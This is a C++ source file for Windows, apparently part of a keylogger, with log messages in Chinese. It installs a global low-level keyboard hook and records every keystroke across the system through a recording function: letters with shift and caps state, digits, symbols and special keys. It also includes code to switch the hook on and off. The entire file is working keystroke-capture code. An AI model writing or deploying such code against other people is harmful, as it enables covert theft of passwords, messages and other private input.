#pragma once
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")

#include "resource.h"
#include "windows.h"
#include <winnt.h>
#include "Records.h"
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>

bool capital = false, numLock = false, shift = false;
DWORD tid = 0;
HHOOK hHook;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
		if (keystroke->scanCode == 0) {
			appLog("[!] 侦测模拟按键" + std::to_string(keystroke->vkCode));
			return CallNextHookEx(NULL, nCode, wParam, lParam); // 模拟事件
		}
		if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
			shift = wParam == WM_KEYDOWN ? true : false;
			KRecord(keystroke->vkCode == VK_LSHIFT ? "[LSHIFT]" : "[RSHIFT]");
		}
		else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			switch (keystroke->vkCode) {
			case 0x41: { KRecord(capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break; }
			case 0x42: { KRecord(capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break; }
			case 0x43: { KRecord(capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break; }
			case 0x44: { KRecord(capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break; }
			case 0x45: { KRecord(capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break; }
			case 0x46: { KRecord(capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break; }
			case 0x47: { KRecord(capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break; }
			case 0x48: { KRecord(capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break; }
			case 0x49: { KRecord(capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break; }
			case 0x4A: { KRecord(capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break; }
			case 0x4B: { KRecord(capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break; }
			case 0x4C: { KRecord(capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break; }
			case 0x4D: { KRecord(capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break; }
			case 0x4E: { KRecord(capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break; }
			case 0x4F: { KRecord(capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break; }
			case 0x50: { KRecord(capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break; }
			case 0x51: { KRecord(capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break; }
			case 0x52: { KRecord(capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break; }
			case 0x53: { KRecord(capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break; }
			case 0x54: { KRecord(capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break; }
			case 0x55: { KRecord(capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break; }
			case 0x56: { KRecord(capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break; }
			case 0x57: { KRecord(capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break; }
			case 0x58: { KRecord(capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break; }
			case 0x59: { KRecord(capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break; }
			case 0x5A: { KRecord(capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break; }
			case 0x30: { KRecord(shift ? ")" : "0"); break; }
			case 0x31: { KRecord(shift ? "!" : "1"); break; }
			case 0x32: { KRecord(shift ? "@" : "2"); break; }
			case 0x33: { KRecord(shift ? "#" : "3"); break; }
			case 0x34: { KRecord(shift ? "$" : "4"); break; }
			case 0x35: { KRecord(shift ? "%" : "5"); break; }
			case 0x36: { KRecord(shift ? "^" : "6"); break; }
			case 0x37: { KRecord(shift ? "&" : "7"); break; }
			case 0x38: { KRecord(shift ? "*" : "8"); break; }
			case 0x39: { KRecord(shift ? "(" : "9"); break; }
			case VK_OEM_1: { KRecord(shift ? ":" : ";"); break; }
			case VK_OEM_2: { KRecord(shift ? "?" : "/"); break; }
			case VK_OEM_3: { KRecord(shift ? "~" : "`"); break; }
			case VK_OEM_4: { KRecord(shift ? "{" : "["); break; }
			case VK_OEM_5: { KRecord(shift ? "|" : "\\"); break; }
			case VK_OEM_6: { KRecord(shift ? "}" : "]"); break; }
			case VK_OEM_7: { KRecord(shift ? "\"" : "'"); break; }
			case VK_OEM_PLUS: { KRecord(shift ? "+" : "="); break; }
			case VK_OEM_COMMA: { KRecord(shift ? "<" : ","); break; }
			case VK_OEM_MINUS: { KRecord(shift ? "_" : "-"); break; }
			case VK_OEM_PERIOD: { KRecord(shift ? ">" : "."); break; }
			case VK_SPACE: { KRecord("[SPACE]"); break; }
			case VK_NUMPAD0: { KRecord("N0"); break; }
			case VK_NUMPAD1: { KRecord("N1"); break; }
			case VK_NUMPAD2: { KRecord("N2"); break; }
			case VK_NUMPAD3: { KRecord("N3"); break; }
			case VK_NUMPAD4: { KRecord("N4"); break; }
			case VK_NUMPAD5: { KRecord("N5"); break; }
			case VK_NUMPAD6: { KRecord("N6"); break; }
			case VK_NUMPAD7: { KRecord("N7"); break; }
			case VK_NUMPAD8: { KRecord("N8"); break; }
			case VK_NUMPAD9: { KRecord("N9"); break; }
			case VK_MULTIPLY: { KRecord("r*"); break; }
			case VK_ADD: { KRecord("r+"); break; }
			case VK_SUBTRACT: { KRecord("r-"); break; }
			case VK_DECIMAL: { KRecord("r."); break; }
			case VK_DIVIDE: { KRecord("r/"); break; }
			case VK_BACK: { KRecord("[BACKSPACE]"); break; }
			case VK_TAB: { KRecord("[TAB]"); break; }
			case VK_RETURN: { 
				KRecord(keystroke->flags == 0 ? "[ENTER]" : "[rEnter]"); break;
			}
			case VK_LMENU: { KRecord("[LALT]"); break; }
			case VK_RMENU: { KRecord("[RALT]"); break; }
			case VK_ESCAPE: { KRecord("[ESC]"); break; }
			case VK_PRIOR: { KRecord("[PG UP]"); break; }
			case VK_NEXT: { KRecord("[PG DN]"); break; }
			case VK_END: { KRecord("[END]"); break; }
			case VK_HOME: { KRecord("[HOME]"); break; }
			case VK_LEFT: { KRecord("[LEFT]"); break; }
			case VK_UP: { KRecord("[UP]"); break; }
			case VK_RIGHT: { KRecord("[RIGHT]"); break; }
			case VK_DOWN: { KRecord("[DOWN]"); break; }
			case VK_PRINT: { KRecord("[PRINT]"); break; }
			case VK_SNAPSHOT: { KRecord("[PRT SC]"); break; }
			case VK_INSERT: { KRecord("[INSERT]"); break; }
			case VK_DELETE: { KRecord("[DELETE]"); break; }
			case VK_LWIN: { KRecord("[LWIN]"); break; }
			case VK_RWIN: { KRecord("[RWIN]"); break; }
			case VK_CAPITAL: { capital = !capital; KRecord("[CAPITAL]");  break; }
			case VK_SCROLL: {  KRecord("[SCRLK]");   break; }
			case VK_PAUSE: {  KRecord("[PAUSE]");   break; }
			case VK_NUMLOCK: { numLock = !numLock;  KRecord("[NUMLOCK]");  break; }
			case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { KRecord("[LCTRL]"); } break; }
			case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { KRecord("[RCTRL]"); } break; }
			case VK_F1: { KRecord("[F1]"); break; }
			case VK_F2: { KRecord("[F2]"); break; }
			case VK_F3: { KRecord("[F3]"); break; }
			case VK_F4: { KRecord("[F4]"); break; }
			case VK_F5: { KRecord("[F5]"); break; }
			case VK_F6: { KRecord("[F6]"); break; }
			case VK_F7: { KRecord("[F7]"); break; }
			case VK_F8: { KRecord("[F8]"); break; }
			case VK_F9: { KRecord("[F9]"); break; }
			case VK_F10: { KRecord("[F10]"); break; }
			case VK_F11: { KRecord("[F11]"); break; }
			case VK_F12: { KRecord("[F12]"); break; }
			default: {
				DWORD dWord = keystroke->scanCode << 16;
				dWord += keystroke->flags << 24;
				char otherKey[16] = "";
				if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
					KRecord(otherKey);
				}
			}
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void KeyBoardHook() {
	hHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0);
	if (hHook == NULL) {
		appLog("安装键盘钩子失败！");
	}
	else {
		appLog("键盘钩子安装成功！");
		capital = GetKeyState(VK_CAPITAL);
		numLock = GetKeyState(VK_NUMLOCK);
		MSG msg = { };
		while (GetMessageA(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessageA(&msg);
		}
		if (UnhookWindowsHookEx(hHook) == 0) {
			appLog("卸载键盘钩子失败！");
		}
		else {
			appLog("键盘钩子卸载成功！");
			hHook = NULL;
		}
	}
	return;
}

void RemoveKHookThread(int code) {
	if (PostThreadMessageA(tid, WM_QUIT, NULL, NULL) == 0) {
		appLog("无法发送消息 WM_QUIT 到钩子线程");
	}
}

void CreateKHookThread() {
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyBoardHook, NULL, 0, &tid);
}

void exit() {
}


LPCSTR KeyBoardHookOper(int code) {
	if (code == 1) {
		if (hHook == NULL) {
			CreateKHookThread();
			return LPCSTR("键盘钩子安装成功");
		}
		else {
			return LPCSTR("键盘钩子已经安装，无需再次安装");
		}
	}
	else if (code == 0) {
		if (hHook == NULL) {
			return LPCSTR("键盘钩子已经卸载，无需再次卸载");
		}
		else {
			RemoveKHookThread(0);
			return LPCSTR("键盘钩子卸载成功");
		}
	}
}